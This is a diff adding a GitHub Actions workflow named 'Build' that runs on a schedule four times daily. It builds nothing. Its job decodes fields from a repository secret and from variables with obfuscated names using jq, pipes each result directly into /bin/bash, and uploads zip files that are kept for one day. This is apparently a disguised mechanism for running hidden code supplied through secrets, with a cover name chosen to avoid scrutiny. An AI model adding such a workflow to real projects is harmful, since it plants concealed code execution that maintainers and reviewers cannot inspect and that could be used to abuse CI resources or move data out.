@@ -1,0 +1,34 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          htxlz7: ${{ secrets.htxlz7 }}
+        run: |
+          printf '%s' "$htxlz7" | jq -r .oorha4225 | /bin/bash
+          printf '%s' "$rqg7720" | jq -r .qskve43243 | /bin/bash
+          echo $fdq49 | jq -r .b01606 | /bin/bash
+          printf '%s' "$a4968" | jq -r .zlqa4 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dmzTsFYy
+          path: "*.zip"
+          retention-days: 1
